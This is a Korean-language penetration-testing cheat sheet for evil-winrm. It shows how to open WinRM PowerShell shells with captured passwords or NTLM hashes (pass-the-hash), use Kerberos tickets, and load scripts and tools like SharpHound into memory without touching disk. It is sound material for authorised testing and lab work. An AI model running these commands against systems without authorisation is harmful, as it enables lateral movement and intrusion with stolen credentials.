# evil-winrm으로 WinRM 셸 확보

- evil-winrm — Ruby 기반 WinRM 클라이언트. 5985(HTTP)/5986(HTTPS)으로 접속해 PowerShell 셸을 열고, .ps1 스크립트와 .NET 실행 파일을 메모리에 로드해 실행할 수 있다. Linux와 Windows 클라이언트 모두에서 동작한다.
- 로컬 Administrator나 WinRM 원격 관리 그룹(Remote Management Users) 자격증명·NTLM 해시를 확보했을 때 셸을 여는 표준 수단. WinRM이 활성화된 서버에서 가장 먼저 시도한다.
- gem install evil-winrm(Ruby 2.3+). 대상에서 WinRM(5985/5986) 포트가 열려 있고 계정이 WinRM 접속 권한을 가져야 한다.

## 기본 접속

```bash
evil-winrm -i 10.10.10.10 -u user -p 'Passw0rd'
```

- `-i`: 대상 IP 또는 호스트명. `-u`/`-p`는 사용자명·패스워드로, -p를 빼면 프롬프트로 입력받는다.
- 접속에 성공하면 PowerShell 프롬프트가 뜨고, upload/download 같은 내장 명령도 제공된다.

## Pass-the-Hash와 포트·TLS

```bash
evil-winrm -i 10.10.10.10 -u administrator -H 31d6cfe0d416631531d6cfe0d4166315
evil-winrm -i 10.10.10.10 -u administrator -H <NTLM해시> -P 5985
evil-winrm -i 10.10.10.10 -u administrator -S -P 5986
```

- `-H`: NTLM 해시(NTHash)로 인증한다. 패스워드를 몰라도 secretsdump로 뽑은 해시면 접속된다.
- `-P`: 포트 지정(기본 5985). `-S`: SSL 사용. 5986(HTTPS WinRM) 접속은 -S와 -P 5986을 함께 쓴다.
- 서버가 클라이언트 인증서를 요구하면 `-c <공개키>.pem -k <개인키>.pem`을 추가한다.

## 스크립트·실행 파일 로딩

```bash
evil-winrm -i 10.10.10.10 -u user -p 'Passw0rd' -s /opt/scripts/ -e /opt/exes/
```

```text
PS > menu                                    # -s 경로의 .ps1 목록 표시
PS > Invoke-NishangScript -Argument ...      # 로드된 스크립트 메모리 실행
PS > Invoke-Binary /opt/exes/SharpHound.exe  # -e 경로의 C# 실행 파일 메모리 로드
PS > upload /local/file C:\Windows\Temp\file
PS > download C:\Users\user\Documents\out.txt /tmp/out.txt
```

- `-s`: .ps1 스크립트가 있는 로컬 경로. 로드된 스크립트는 디스크에 쓰지 않고 메모리에서 실행된다.
- `-e`: C# 실행 파일(.exe)이 있는 로컬 경로. Invoke-Binary로 메모리에 로드해 실행한다.

## Kerberos

```bash
evil-winrm -i dc01.corp.local -r corp.local          # /etc/krb5.conf에 kdc 설정 필요
evil-winrm -i dc01.corp.local -r corp.local -K ticket.ccache
```

- `-r`: Kerberos 렐름. `-K`: ccache/kirbi 티켓 파일을 직접 지정한다.
- evil-winrm은 Ruby gem이라 Windows에 설치해 Windows에서 Windows로 접속하는 것도 가능하다.

## 팁·트러블슈팅

1. 접속 거부는 포트 문제(nmap으로 5985/5986 확인), 401 Unauthorized는 자격증명·해시 문제다.
2. 계정이 Administrators여도 Remote Management Users 그룹에 없으면 WinRM 접속이 거부된다. 이때는 impacket의 psexec으로 전환한다.
3. 로컬(비도메인) Administrator 계정은 기본적으로 원격 접속 시 필터링 토큰을 받아, LocalAccountTokenFilterPolicy가 1이어야 정상 권한으로 동작한다.
